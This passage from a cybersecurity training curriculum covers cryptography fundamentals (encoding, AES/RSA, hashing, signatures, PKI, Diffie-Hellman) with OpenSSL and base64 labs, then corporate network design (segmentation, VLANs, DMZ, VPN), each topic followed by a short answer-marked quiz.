   > Encoding (e.g. Base64) is simply a reformatting and can be reversed by anyone with no key needed.
2. Why is hashing considered one-way?
   - Because it requires a public/private keypair
   - **Because there is no key that reverses a hash back to the original input** ✓
   - Because it is a form of encoding
   - Because it always produces variable-length output
   > Hashing produces a fixed-length digest with no key that can recover the original input; it's a one-way function.
3. OWASP's 'Cryptographic Failures' category (A02) is largely caused by:
   - Using too many hash algorithms
   - **Treating encoding, encryption, or hashing as if they were interchangeable with each other** ✓
   - Using AES for encryption
   - Enforcing password complexity
   > OWASP A02 largely stems from confusing these three (e.g. using encoding or a fast hash where encryption is needed).

#### 65. Common Encoding Schemes (Base64, URL encoding, HTML encoding) `[theory]` — Week 5

Encoding schemes exist to safely represent data in a different format (e.g. binary-safe text, or characters safe for a URL) — never to hide or protect it.

**Key Points:**

- Base64: encodes binary data as ASCII text, commonly seen in Basic Auth headers and Burp's Decoder tool
- URL encoding: escapes special characters for safe inclusion in a URL — space becomes %20
- HTML encoding: escapes characters with HTML meaning (< becomes &lt;) — the core defence against XSS

**Resources:**

- [MDN - Base64](https://developer.mozilla.org/en-US/docs/Glossary/Base64) _(link)_
- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) _(link)_

**Quick Quiz:**

1. Base64 encoding is most commonly used for:
   - Encrypting binary data with a secret key
   - **Representing binary data as ASCII text, e.g. in Basic Auth headers** ✓
   - Making data completely unreadable to anyone
   - Hashing passwords securely
   > Base64 encodes binary data as ASCII text and is commonly seen in Basic Auth headers and Burp's Decoder -- it provides no security.
2. What does URL encoding do to a space character?
   - **Converts it to %20** ✓
   - Converts it to &lt;
   - Removes it entirely
   - Converts it to \x00
   > URL encoding escapes special characters for safe inclusion in a URL; a space becomes %20.
3. HTML encoding converting '<' to '&lt;' is primarily a defence against which attack?
   - SQL Injection
   - **Cross-Site Scripting (XSS)** ✓
   - Command Injection
   - Path Traversal
   > HTML encoding escapes characters with special HTML meaning, which is the core defence against XSS.

#### 66. Symmetric Cryptography (AES, DES, 3DES, key exchange problem) `[theory]` — Week 5

Symmetric crypto uses the same key to encrypt and decrypt — both sender and receiver must possess that identical secret key. Concretely: agree on a secret key like 'mysecretkey', run 'Hello, World!' through an AES-family cipher to get ciphertext, and running that same key back through decryption recovers the original text. AES and DES are the two algorithms named as common symmetric ciphers. The real-world failure mode, and its own named cryptographic-failure category, is poor key management: hardcoding a key directly in source code (e.g. ENCRYPTION_KEY = "mysecretkey123") means anyone who reaches that source can read and misuse the key — the fix is environment variables or a secrets vault, never a literal in the codebase.

**Key Points:**

- Symmetric encryption uses the same key for both encryption and decryption — both parties must have access to that identical secret key
- Worked example: plaintext 'Hello, World!' + secret key 'mysecretkey' -> AES produces ciphertext (e.g. 3b1e9e1c2d3a...); running the same key back through decryption recovers 'Hello, World!'
- Common algorithms named: AES (Advanced Encryption Standard) and DES (Data Encryption Standard)
- AES (Advanced Encryption Standard): the modern standard, used in Wi-Fi (WPA2/3), file storage, corporate comms
- DES/3DES: older, now considered weak/deprecated (DES has a trivially small 56-bit key)
- Use cases: encrypting data at rest, VPN tunnels, disk encryption (BitLocker uses AES)
- Poor key management is its own cryptographic-failure category: a hardcoded key like ENCRYPTION_KEY = "mysecretkey123" directly in source code is trivially recoverable by anyone with source access — store keys in environment variables or a secure vault instead

```bash
from cryptography.fernet import Fernet
key = Fernet.generate_key()
Fernet(key).encrypt(b'secret message')
```

**Resources:**

- [NIST FIPS 197 (AES)](https://csrc.nist.gov/pubs/fips/197/final) _(link)_
- [CryptoHack](https://cryptohack.org) _(platform)_
- [Python cryptography library documentation](https://cryptography.io) _(link)_

**Quick Quiz:**

1. What is the 'key exchange problem' in symmetric cryptography?
   - The difficulty of generating any key at all
   - **Both parties needing the same secret key, which is hard to share securely** ✓
   - Symmetric crypto having no keys
   - Symmetric crypto being too slow to use
   > Since symmetric crypto uses the same key for encryption and decryption, securely getting that shared key to both parties is the key exchange problem.
2. Which symmetric algorithm is now considered weak due to its small 56-bit key size?
   - AES
   - **DES** ✓
   - RSA
   - SHA-256
   > DES uses a trivially small 56-bit key and is considered weak/deprecated compared to AES.
3. AES is used in which of the following real-world contexts?
   - **Wi-Fi encryption (WPA2/3) and disk encryption like BitLocker** ✓
   - Only in Base64 encoding
   - Only in Diffie-Hellman key exchange
   - Only in digital signatures
   > AES is the modern symmetric standard used in Wi-Fi encryption and disk/file encryption such as BitLocker.

#### 67. Asymmetric Cryptography (RSA, ECC, public/private key pair) `[theory]` — Week 5

Asymmetric crypto uses a mathematically-linked key pair — a public key anyone can use to encrypt, and a private key only the owner holds to decrypt — solving the symmetric key-exchange problem, since the public key never needs to be kept secret. Concretely: to send a friend a secure message you encrypt with their public key, and only their private key can reverse it. RSA and ECC are the two algorithms named for this.

**Key Points:**

- Asymmetric encryption uses two different keys: a public key (shared with everyone, used to encrypt) and a private key (kept secret, used to decrypt)
- Worked example: encrypt 'Hello, World!' using the friend's public key to get ciphertext (e.g. a1b2c3d4...); only the friend's private key can decrypt it back to plaintext
- Common algorithms named: RSA (Rivest-Shamir-Adleman) and ECC (Elliptic Curve Cryptography)
- RSA: based on the difficulty of factoring large primes; widely used for TLS and digital signatures
- ECC (Elliptic Curve Cryptography): smaller keys than RSA for equivalent security, used in modern TLS and cryptocurrency
- Use cases: HTTPS/TLS handshakes, secure email (PGP), digital signatures, SSH key auth

**Resources:**

- [CryptoHack](https://cryptohack.org) _(platform)_
- [Khan Academy - Cryptography](https://www.khanacademy.org/computing/computer-science/cryptography) _(video)_
- [NIST SP 800-56A](https://csrc.nist.gov/pubs/sp/800/56/a/r3/final) _(link)_

**Quick Quiz:**

1. In asymmetric cryptography, what is used to encrypt data intended for only the owner to read?
   - The owner's private key
   - **The owner's public key** ✓
   - A shared symmetric key
   - A hash of the data
   > Anyone can encrypt with the recipient's public key, but only the corresponding private key can decrypt it.
2. RSA's security is based on the difficulty of:
   - **Factoring large prime numbers** ✓
   - Reversing a hash function
   - Brute-forcing AES keys
   - Guessing a Base64 string
   > RSA relies on the computational difficulty of factoring the product of two large primes.
3. Compared to RSA, ECC (Elliptic Curve Cryptography) offers:
   - Larger keys for the same security level
   - **Smaller keys for an equivalent level of security** ✓
   - No use in TLS
   - Only symmetric encryption
   > ECC achieves equivalent security to RSA with much smaller key sizes, and is widely used in modern TLS.

#### 68. Hashing Algorithms (MD5, SHA-1, SHA-256, bcrypt, Argon2) `[theory]` — Week 5

Not all hashes are equal for password storage. General-purpose hashes are fast — exactly the wrong property for passwords — and MD5/SHA-1 are additionally broken and crackable, with no built-in salting. A real weak-password-storage failure looks like this: username 'alice', password 'password123' stored in plain text, fully readable by anyone who reaches the database. bcrypt and Argon2 fix this by being deliberately slow and by auto-generating a per-hash salt: registration hashes the password with bcrypt.hashpw(password.encode(), bcrypt.gensalt()) and stores only the hash, and login verifies with bcrypt.checkpw() rather than ever storing or directly comparing plaintext.

**Key Points:**

- Weak password storage is a named cryptographic-failure category: storing plaintext passwords, using crackable MD5/SHA-1, or skipping salt entirely
- Concrete bad example from source material: a site storing username: alice / password: password123 in plain text — anyone who reaches the database reads every password directly
- MD5, SHA-1: broken/crackable, and offer no built-in salting — never use for password storage
- SHA-256: still cryptographically fine for integrity checks (file hashes) but too fast for password storage
- bcrypt, Argon2: purpose-built for passwords — deliberately slow, with automatic per-hash salting
- Good-practice pattern: register() hashes with bcrypt.hashpw(password.encode(), bcrypt.gensalt()) and stores only the hash; login() calls bcrypt.checkpw(password.encode(), stored_hash) — the plaintext password itself is never stored or directly compared

```bash
import bcrypt
hashed = bcrypt.hashpw(b'myPassword', bcrypt.gensalt())
bcrypt.checkpw(b'myPassword', hashed)
```

**Resources:**

- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) _(link)_
- [Argon2 reference implementation](https://github.com/P-H-C/phc-winner-argon2) _(link)_
- [CryptoHack](https://cryptohack.org) _(platform)_

**Quick Quiz:**

1. Why are MD5 and SHA-1 unsuitable for password storage?
   - They are too slow to compute
   - **They are broken/crackable and lack built-in salting** ✓
   - They are asymmetric algorithms
   - They require a private key
   > MD5/SHA-1 are cryptographically broken and don't provide automatic salting, making them unsuitable and dangerous for password storage.
2. Why is bcrypt preferred over SHA-256 specifically for hashing passwords?
   - bcrypt is faster than SHA-256
   - **bcrypt is deliberately slow and includes automatic per-hash salting** ✓
   - SHA-256 cannot process text input
   - bcrypt is a symmetric encryption algorithm
   > bcrypt (and Argon2) are purpose-built for passwords -- deliberately slow with automatic salting, unlike the fast general-purpose SHA-256.
3. SHA-256 remains appropriate for which use case?
   - Password storage
   - **File integrity checks** ✓
   - Encrypting a VPN tunnel
   - Generating a session cookie's encryption key
   > SHA-256 is still cryptographically fine for integrity verification (like file hashes) but too fast for secure password storage.

#### 69. Digital Signatures (how they work, signing & verification) `[theory]` — Week 5

A digital signature proves both integrity and authenticity — the sender signs data with their private key, and anyone can verify it using the sender's public key.

**Key Points:**

- Signing: hash the message, then encrypt that hash with the signer's private key
- Verification: decrypt the signature with the sender's public key and compare to a fresh hash of the message
- Used in code-signing (verifying software hasn't been tampered with) and TLS certificates

**Resources:**

- [CryptoHack](https://cryptohack.org) _(platform)_
- [NIST FIPS 186-5 (Digital Signature Standard)](https://csrc.nist.gov/pubs/fips/186-5/final) _(link)_
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) _(link)_

**Quick Quiz:**

1. When creating a digital signature, what does the signer encrypt with their private key?
   - The entire plaintext message
   - **A hash of the message** ✓
   - The recipient's public key
   - A randomly generated session key
   > Signing hashes the message first, then encrypts that hash with the signer's private key.
2. To verify a digital signature, the verifier uses:
   - The signer's private key
   - **The signer's public key** ✓
   - Their own private key
   - A shared symmetric key
   > Verification decrypts the signature using the signer's public key and compares it to a fresh hash of the message.
3. Digital signatures primarily provide which two security properties?
   - Confidentiality and availability
   - **Integrity and authenticity** ✓
   - Encoding and compression
   - Anonymity and speed
   > A digital signature proves the message hasn't been altered (integrity) and confirms who sent it (authenticity).

#### 70. Certificates & PKI (X.509, CA, chain of trust, TLS handshake) `[theory]` — Week 5

PKI (Public Key Infrastructure) is the system of Certificate Authorities (CAs) that lets your browser trust that a public key really belongs to the site claiming it.

**Key Points:**

- X.509 certificates bind a public key to an identity (domain name), signed by a trusted CA
- Chain of trust: your OS/browser trusts a small set of Root CAs, which sign Intermediate CAs, which sign site certificates
- TLS handshake (simplified): client/server agree on cipher suite → server presents certificate → key exchange → encrypted session begins

**Resources:**

- [MDN - Transport Layer Security](https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security) _(link)_
- [Let's Encrypt documentation](https://letsencrypt.org/docs/) _(link)_
- [DigiCert - What is PKI](https://www.digicert.com/what-is-pki) _(link)_

**Quick Quiz:**

1. An X.509 certificate primarily binds:
   - A private key to a hash algorithm
   - **A public key to an identity (e.g. a domain name)** ✓
   - A symmetric key to a session
   - A username to a password
   > X.509 certificates bind a public key to an identity, signed by a trusted Certificate Authority.
2. The 'chain of trust' in PKI describes:
   - A single Root CA signing every website certificate directly
   - **Root CAs signing Intermediate CAs, which sign site certificates** ✓
   - A peer-to-peer trust with no CAs involved
   - Browsers trusting every certificate automatically
   > Root CAs (trusted by the OS/browser) sign Intermediate CAs, which in turn sign individual site certificates.
3. In a simplified TLS handshake, what happens right after the client and server agree on a cipher suite?
   - The session ends immediately
   - **The server presents its certificate** ✓
   - The client sends its password
   - The connection is immediately broken
   > After cipher suite negotiation, the server presents its certificate, followed by key exchange and the start of the encrypted session.

#### 71. Key Exchange (Diffie-Hellman, ECDH) `[theory]` — Week 5

Key exchange protocols let two parties agree on a shared secret over an untrusted channel without ever transmitting the secret itself.

**Key Points:**

- Diffie-Hellman: both parties combine their own private value with a shared public value to independently derive the same secret
- ECDH: the elliptic-curve variant of Diffie-Hellman, used throughout modern TLS for forward secrecy

**Resources:**

- [CryptoHack](https://cryptohack.org) _(platform)_
- [Khan Academy - Cryptography](https://www.khanacademy.org/computing/computer-science/cryptography) _(video)_
- [NIST SP 800-56A](https://csrc.nist.gov/pubs/sp/800/56/a/r3/final) _(link)_

**Quick Quiz:**

1. What problem does Diffie-Hellman key exchange solve?
   - Hashing passwords securely
   - **Allowing two parties to derive a shared secret over an untrusted channel without transmitting it directly** ✓
   - Encoding binary data as text
   - Verifying a digital signature
   > Diffie-Hellman lets both parties independently compute the same shared secret using public values, without ever sending the secret itself.
2. ECDH is best described as:
   - A hashing algorithm
   - **The elliptic-curve variant of Diffie-Hellman used in modern TLS** ✓
   - A symmetric block cipher
   - A password-hashing function
   > ECDH is the elliptic-curve version of Diffie-Hellman, widely used in TLS for forward secrecy.
3. What security property does ECDH commonly enable in modern TLS?
   - **Perfect/forward secrecy** ✓
   - Base64 encoding
   - SUID privilege escalation
   - ARP spoofing prevention
   > ECDH-based key exchange in TLS supports forward secrecy, meaning a compromised long-term key can't decrypt past sessions.

#### 72. Lab: Manually encode/decode strings in Base64 & URL encoding `[lab]` — Week 5

Practice converting strings between plaintext, Base64, and URL encoding by hand before relying on tooling — this builds the intuition needed to instantly recognise encoded data during recon/exploitation.

**Key Points:**

- Encode 5 different strings to Base64, then decode them back without a tool first, then verify with CyberChef
- URL-encode a string containing special characters (&, =, /, space) and confirm each substitution
- Recognise the telltale '=' padding characters and character set of Base64 output

```bash
echo -n 'Hello World' | base64
echo 'SGVsbG8gV29ybGQ=' | base64 -d
```

**Resources:**

- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_
- [MDN - Percent-encoding](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) _(link)_

**Quick Quiz:**

1. What is the significance of the '=' padding characters at the end of some Base64 strings?
   - They indicate an encryption key was used
   - **They pad the encoded output to a multiple of 4 characters** ✓
   - They mark the string as hashed
   - They indicate the string is URL-encoded
   > Base64 encoding groups input into 4-character blocks, using '=' padding when the input length isn't a multiple of 3 bytes.
2. Which command decodes a Base64 string back to plaintext on Linux?
   - **base64 -d** ✓
   - base64 -e
   - echo -n
   - curl -I
   > The -d flag on the base64 command decodes a Base64 string back to its original form.
3. When URL-encoding a string, which character is typically converted to '%3D'?
   - Space
   - **Equals sign (=)** ✓
   - Forward slash (/)
   - Ampersand (&)
   > The equals sign is reserved in URL query strings and is percent-encoded as %3D when it needs to appear as literal data.

#### 73. Lab: Generate RSA keypair with OpenSSL, sign & verify a file `[lab]` — Week 5

Hands-on OpenSSL lab — generate a real RSA keypair, then use it to sign and verify a file's digital signature.

**Key Points:**

- Generate a private key first, then derive the public key from it
- Sign a file's hash with the private key; verify the signature using only the public key
- Confirm that tampering with the file after signing causes verification to fail

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
openssl dgst -sha256 -sign private.pem -out file.sig file.txt
openssl dgst -sha256 -verify public.pem -signature file.sig file.txt
```

**Resources:**

- [OpenSSL documentation](https://www.openssl.org/docs/) _(link)_
- [CryptoHack](https://cryptohack.org) _(platform)_

**Quick Quiz:**

1. Which OpenSSL command generates a 2048-bit RSA private key?
   - openssl rsa -pubout
   - **openssl genrsa -out private.pem 2048** ✓
   - openssl dgst -sha256
   - openssl req -x509
   > openssl genrsa -out private.pem 2048 generates a new 2048-bit RSA private key.
2. After generating the private key, how do you derive the corresponding public key?
   - **openssl rsa -in private.pem -pubout -out public.pem** ✓
   - openssl genrsa -pubout
   - openssl dgst -verify
   - openssl enc -aes256
   > openssl rsa -in private.pem -pubout -out public.pem extracts the public key from the private key file.
3. If a signed file is modified after signing, what happens when you attempt to verify it with the original signature?
   - Verification succeeds anyway
   - **Verification fails because the file's hash no longer matches the signed hash** ✓
   - The public key is regenerated automatically
   - The private key becomes invalid
   > Since the signature is built from a hash of the original file, any modification changes the hash and causes verification to fail.


---

## M6: Corporate Networks

**Month 2** · Week 6 · 12 topics

Real engagements target corporate environments, not standalone machines. This module covers how organisations actually segment, defend, and manage their internal networks — DMZ, VLANs, Active Directory, Zero Trust — the terrain every later recon and exploitation module assumes you understand.

**Learning Outcomes:**

- Explain corporate network architecture and common topologies
- Describe DMZ design and why public-facing services are isolated there
- Understand VLANs, segmentation, and their security benefits
- Explain Active Directory's role and Zero Trust principles
- Compare EDR, IDS/IPS, WAF, and NGFW as layered defences

**Module Resources:**

- [TryHackMe AD Basics](https://tryhackme.com) _(platform)_
- [draw.io](https://app.diagrams.net) _(tool)_
- [BloodHound](https://bloodhound.readthedocs.io) _(tool)_
- [Microsoft Active Directory documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ad-ds-getting-started) _(link)_

**Module Quiz (10 questions):**

1. Which network design choice most directly limits how far an attacker can move laterally after compromising one host?
   - A flat network topology
   - **VLAN segmentation with restricted inter-VLAN routing** ✓
   - Removing all VPNs
   - Disabling DNS
   > Segmenting into VLANs with controlled Layer-3 routing between them limits lateral movement compared to a flat network.
2. In a properly designed DMZ, why is DMZ-to-Internal traffic strictly restricted while Internet-to-DMZ is allowed?
   - **Because the DMZ hosts public-facing services that need external reachability but must not become a stepping stone into sensitive internal systems** ✓
   - Because DMZ servers are more trusted than internal ones
   - Because Internet-to-Internal is always allowed instead
   - Because DMZ has no firewall rules at all
   > The DMZ intentionally isolates internet-facing services so that if one is compromised, the attacker still can't freely reach the internal LAN.
3. Why is Active Directory typically the single highest-value target in a corporate pentest?
   - It has no valuable data
   - **Compromising AD (e.g. reaching Domain Admin) grants centralized control over users, computers, and permissions across the whole domain** ✓
   - AD only manages printers
   - AD is always isolated in its own DMZ
   > Because AD centrally manages authentication and authorization for the whole Windows network, gaining Domain Admin effectively compromises the entire domain.
4. How does Zero Trust's 'assume breach' principle change traditional perimeter-based security thinking?
   - It assumes the perimeter firewall alone is sufficient
   - **It assumes an attacker may already be inside, so every request must be verified regardless of network location** ✓
   - It removes the need for authentication
   - It only applies to external users
   > Zero Trust assumes the perimeter can't be fully trusted and continuously verifies every request, rather than trusting anything already 'inside'.
5. An EDR solution flags unusual process behavior that a signature-based AV missed entirely. What best explains this difference in detection capability?
   - **EDR uses real-time behavioural analysis rather than only matching known malware signatures** ✓
   - EDR is simply a rebranded antivirus with no functional difference
   - Signature-based AV is always superior
   - EDR only scans files at rest
   > EDR's continuous behavioural monitoring can detect anomalous activity that static signature matching in traditional AV would miss.
6. Which combination of controls would best defend a public-facing web application against both network-layer scanning and application-layer attacks like SQLi?
   - An NGFW alone with no WAF
   - **A WAF for HTTP/HTTPS payload inspection plus an NGFW/firewall for broader network-layer filtering** ✓
   - Only network segmentation with no firewall at all
   - Disabling all logging to improve performance
   > A WAF is purpose-built to catch SQLi/XSS-style payloads in HTTP traffic, while an NGFW provides broader network and application-aware filtering -- together they form layered defence.
7. Why might anomaly-based IDS generate more false positives than signature-based IDS, despite catching more novel attacks?
   - **Because it flags any deviation from a learned baseline of 'normal' behaviour, which can include legitimate but unusual activity** ✓
   - Because it only checks a fixed list of known bad signatures
   - Because it never analyses live traffic
   - Because it is identical to a WAF
   > Anomaly detection is more sensitive to any deviation from the baseline, which increases the chance of flagging legitimate but atypical behaviour as suspicious.
8. In VDI, why does keeping data 'on the server' rather than the endpoint reduce risk?
   - **Because a lost/stolen endpoint device does not itself contain sensitive corporate data** ✓
   - Because it eliminates the need for a hypervisor
   - Because it removes the need for a Connection Broker
   - Because it disables remote display protocols
   > Since the actual desktop/data runs on centralized servers and is only streamed to the endpoint, a compromised or stolen endpoint doesn't expose the underlying data directly.
9. A pentester gains a foothold on a workstation in the Finance VLAN. Under a well-segmented Zero Trust corporate network, what should NOT happen next?
   - **The pentester should be automatically able to reach the Domain Controller and HR VLAN without further authentication or verification** ✓
   - The pentester's further requests should still be verified/authenticated even though they're inside the network
   - Micro-segmentation should still limit which other segments are reachable
   - The workstation being compromised should still trigger monitoring/alerts
   > Under Zero Trust and proper segmentation, being on one VLAN should not grant free lateral access to the Domain Controller or other VLANs without further verification.
10. Which statement correctly ranks these technologies by where they primarily operate in a defence-in-depth stack?
   - **WAF (Layer 7 app traffic), EDR (endpoint), IDS/IPS (network traffic), AD/Zero Trust (identity/access)** ✓
   - All of these operate at exactly the same layer
   - EDR operates at Layer 3 only
   - WAF replaces the need for IDS/IPS entirely
   > Each control targets a different layer: WAF inspects application-layer HTTP traffic, EDR protects the endpoint itself, IDS/IPS monitors network traffic, and AD/Zero Trust governs identity and access -- together forming layered defence.

### Topics

#### 74. Corporate Network Architecture Overview `[theory]` — Week 6

Think of a corporate network the way this material frames it: like an office building. The building is the organization; each room is a department (HR, Finance, IT) that needs to share documents and collaborate; corridors are the LAN linking people within the same building; elevators and the internet are the WANs connecting distant offices or branches into one unit; security guards at the entrances are the firewalls keeping unauthorized people out; and the IT team is the maintenance crew fixing broken connections, upgrading facilities, and patching vulnerabilities. The concrete payoff shows up as increased productivity (a marketing team co-editing a presentation in Google Drive/Microsoft Teams in real time), cost reduction (one shared printer and centralized servers instead of hardware per department), improved security (only the HR team can reach the payroll system), enhanced mobility (a travelling salesperson updates client data over VPN), and centralized data storage (a crashed laptop doesn't lose work, because it lives on the central server).

**Key Points:**

- Analogy: rooms = departments (HR/Finance/IT sharing documents), corridors = LAN, elevators & internet = WANs connecting distant offices/branches, security guards = firewalls, IT team = maintenance crew fixing connections and patching vulnerabilities
- Technical framing: LANs connect devices within the same office/building; WANs extend connectivity to remote offices, keeping operations smooth across locations
- Increased Productivity: shared drives/Teams/Google Drive let a marketing team co-edit a presentation in real time
- Cost Reduction: one shared printer and centralized servers instead of buying hardware for every department
- Improved Security: sensitive data like payroll is restricted — e.g. only the HR team can access the payroll system
- Enhanced Mobility: employees work from home or while travelling via VPN — e.g. a salesperson updates client information on the go
- Centralized Data Storage: documents live on a central server rather than personal machines — if an employee's laptop crashes, their work is still retrievable from the server
- Corporate network security = the practices, policies, and technologies safeguarding the network from unauthorised access and breaches, keeping only authorized users able to reach critical systems and data

**Resources:**

- [Cisco Networking Academy](https://www.netacad.com) _(platform)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_
- [NIST SP 800-41 (Firewall Guidelines)](https://csrc.nist.gov/pubs/sp/800/41/r1/final) _(link)_

**Quick Quiz:**

1. What is a key benefit of a corporate network architecture, according to this topic?
   - Elimination of the need for firewalls
   - **Centralised storage/backup and controlled access to systems like payroll** ✓
   - Making every device permanently visible to the internet
   - Removing the need for network segmentation
   > Corporate networks provide shared resources, centralized storage/backup, and controlled/restricted access to sensitive systems.
2. In the 'office building' analogy used for corporate networks, what do firewalls represent?
   - The rooms/departments
   - The corridors
   - **Security guards controlling entry** ✓
   - The furniture
   > Firewalls act as the security guards controlling entry/exit between zones, analogous to rooms (departments) and corridors (the LAN).
3. Corporate network security is best defined as:
   - A single antivirus product
   - **The practices, policies, and technologies safeguarding the network from unauthorised access and breaches** ✓
   - Only the physical locks on server room doors
   - A type of encryption algorithm
   > This topic defines corporate network security broadly as the combination of practices, policies, and technologies protecting the network.

#### 75. Network Topologies in Enterprise (Segmented, Flat, Hub-and-Spoke) `[theory]` — Week 6

How a network's physical/logical layout is designed shapes both its performance and its blast radius when a single host is compromised.

**Key Points:**

- Flat network: everything on one broadcast domain — simplest, but a single compromised host can reach everything
- Segmented network: split into zones/VLANs, limiting lateral movement if one segment is breached
- Hub-and-spoke: a central site connects to multiple branch sites, common in multi-office organisations

**Resources:**

- [Cisco Networking Academy](https://www.netacad.com) _(platform)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. What is the main security drawback of a flat network topology?
   - It has no internet access
   - **A single compromised host can potentially reach every other device on the network** ✓
   - It requires too many VLANs
   - It cannot support Wi-Fi
   > In a flat network everything sits on one broadcast domain, so a single compromised host can reach everything.
2. A segmented network improves security primarily by:
   - Removing all firewalls
   - **Splitting the network into zones/VLANs, limiting lateral movement if one segment is breached** ✓
   - Increasing broadcast traffic across zones
   - Disabling encryption
   > Segmentation isolates zones so a breach in one segment doesn't automatically grant access to others.
3. A hub-and-spoke topology is most associated with which scenario?
   - A single home Wi-Fi network
   - **A central site connecting to multiple branch office sites** ✓
   - A single-server flat network
   - A DMZ-only design
   > Hub-and-spoke connects a central site to multiple branch sites, common in multi-office organisations.

#### 76. VLANs (Virtual LANs) & Network Segmentation `[theory]` — Week 6

A VLAN is a logical separation of network devices that lets administrators segment one physical network into multiple isolated broadcast domains, improving security, performance, and management — like adding invisible walls to create separate rooms inside one large hall. Switch ports are assigned VLAN IDs (e.g. VLAN 10 = HR, VLAN 20 = IT, VLAN 30 = Finance); each VLAN behaves as its own LAN; a Layer-3 device is required to route traffic between VLANs; and 802.1Q tagging lets VLAN traffic travel across trunk links between switches. The security payoff is concrete: even if all three departments' machines plug into the very same physical switch, a VLAN 10 (HR) user can't see or talk to a VLAN 20 (IT) user unless that traffic is explicitly routed and allowed.

**Key Points:**

- Why: security segmentation, reduced broadcast traffic, logical grouping (HR/Finance/IT) instead of physical grouping, better access control and traffic isolation
- Switch ports are assigned VLAN IDs; a Layer-3 device (router or Layer-3 switch) is needed for inter-VLAN routing
- 802.1Q is the standard tagging protocol used on trunk links carrying multiple VLANs between switches
- Example: VLAN 10=HR, VLAN 20=IT, VLAN 30=Finance — isolated from each other unless explicitly routed
- Even if all computers are connected to the same physical switch, users in one VLAN can't see or communicate with another VLAN unless the traffic is routed and explicitly allowed

**Resources:**

- [Cisco Networking Academy](https://www.netacad.com) _(platform)_
- [IEEE 802.1Q standard](https://www.ieee802.org/1/pages/802.1Q.html) _(link)_

**Quick Quiz:**

1. What does the 802.1Q standard provide?
   - DNS resolution
   - **VLAN tagging on trunk links carrying multiple VLANs** ✓
   - Firewall rule syntax
   - AES encryption
   > 802.1Q is the standard protocol for tagging frames with VLAN IDs on trunk links.
2. To route traffic between two different VLANs, what is required?
   - A hub
   - **A Layer-3 device (e.g. a router or Layer-3 switch)** ✓
   - A DMZ
   - An unmanaged Layer-2 switch alone
   > VLANs are isolated broadcast domains at Layer 2; inter-VLAN routing requires a Layer-3 capable device.
3. Why might an organisation put HR, IT, and Finance on separate VLANs?
   - To increase broadcast traffic
   - **To provide security segmentation and logical grouping with better access control** ✓
   - To make devices in different VLANs communicate freely by default
   - To eliminate the need for a firewall
   > VLANs (e.g. VLAN 10=HR, 20=IT, 30=Finance) provide segmentation, reduce broadcast domains, and enable per-group access control.

#### 77. DMZ (Demilitarised Zone) - Purpose & Design `[theory]` — Week 6

A DMZ is an isolated subnet sitting between the trusted internal LAN and the untrusted internet, exposing only the services that must be reachable from outside while shielding everything else. In a typical 3-legged firewall, one interface faces the internet, one faces the internal LAN, and one faces the DMZ, with traffic rules enforced accordingly: Internet -> DMZ is allowed (e.g. HTTP to a web server), DMZ -> Internal is strictly restricted, Internal -> DMZ is allowed for administration, and Internet -> Internal is blocked outright. The point is containment: if a public-facing server in the DMZ is compromised, the attacker can't easily pivot straight into the internal network.

**Key Points:**

- Typical 3-legged firewall setup: Internet interface, Internal LAN interface, DMZ interface
- Traffic rules: Internet→DMZ allowed; DMZ→Internal strictly restricted; Internal→DMZ allowed (admin); Internet→Internal blocked
- Purpose — isolate public services: if a public server in the DMZ gets compromised, the attacker can't easily pivot into the internal network
- Purpose — limit attack surface: only specific ports/services are exposed to the internet at all
- Purpose — logging and monitoring: easier to detect malicious activity when it's concentrated against public-facing DMZ assets
- Common DMZ services: web servers (HTTP/HTTPS), mail servers (SMTP), DNS servers, VPN gateways, and reverse proxies/load balancers

**Resources:**

- [Cisco Networking Academy](https://www.netacad.com) _(platform)_
- [NIST SP 800-41 (Firewall Guidelines)](https://csrc.nist.gov/pubs/sp/800/41/r1/final) _(link)_

**Quick Quiz:**

1. In a typical DMZ design, which traffic flow is normally allowed?
   - Internet directly to Internal LAN
   - DMZ to Internal LAN unrestricted
   - **Internet to DMZ (for public-facing services)** ✓
   - Internal LAN blocked from reaching DMZ entirely
   > The DMZ hosts public-facing services, so Internet-to-DMZ traffic is allowed, while DMZ-to-Internal is strictly restricted and Internet-to-Internal is blocked.
2. Which of the following is a typical service hosted in a DMZ?
   - The domain controller holding all AD credentials
   - **A public-facing web server** ✓
   - The internal payroll database
   - The HR file share
   > DMZs typically host services that must be reachable from the internet, such as web servers, mail servers, and reverse proxies -- not sensitive internal systems.
3. Why is a 3-legged firewall setup used for a DMZ?
   - To provide three separate physical buildings
   - **To give the firewall distinct interfaces for Internet, Internal LAN, and DMZ, each with its own rules** ✓
   - To triple network bandwidth
   - To replace VLAN tagging entirely
   > A 3-legged firewall has separate interfaces for Internet, Internal, and DMZ zones, enforcing distinct traffic rules between each pair.

#### 78. VPN in Corporate Environments (site-to-site, remote access) `[theory]` — Week 6

Corporate VPNs create an encrypted tunnel for traffic: connect to a VPN server, the VPN encrypts everything, the encrypted data travels securely over the internet, the server forwards the request to its destination, and the response returns to the user via the same tunnel — hiding the user's IP and making it hard for hackers, websites, or even the ISP to track activity. Beyond the basic Remote Access / Site-to-Site split, real deployments name several distinct flavors, each with its own tradeoffs worth knowing when assessing a client's network.

**Key Points:**

- Remote Access VPN: individual employees connect in from home/travel
- Site-to-Site VPN: permanently links two office networks together over the internet
- SSL/TLS VPN: uses SSL/TLS to provide encrypted access through a web browser
- IPSec VPN: a common VPN protocol providing strong security for data transmission
- MPLS VPN: used by large enterprises for secure, efficient network communication
- Cloud VPN: secure access to cloud-based resources without traditional on-premises VPN infrastructure
- Flow: connect to VPN server → encrypt traffic → travel securely → server forwards to destination → response returns via tunnel
- Advantages: encrypts all traffic against hackers/surveillance, masks the real IP for anonymity, bypasses censorship/restricted content, secures public Wi-Fi against data theft
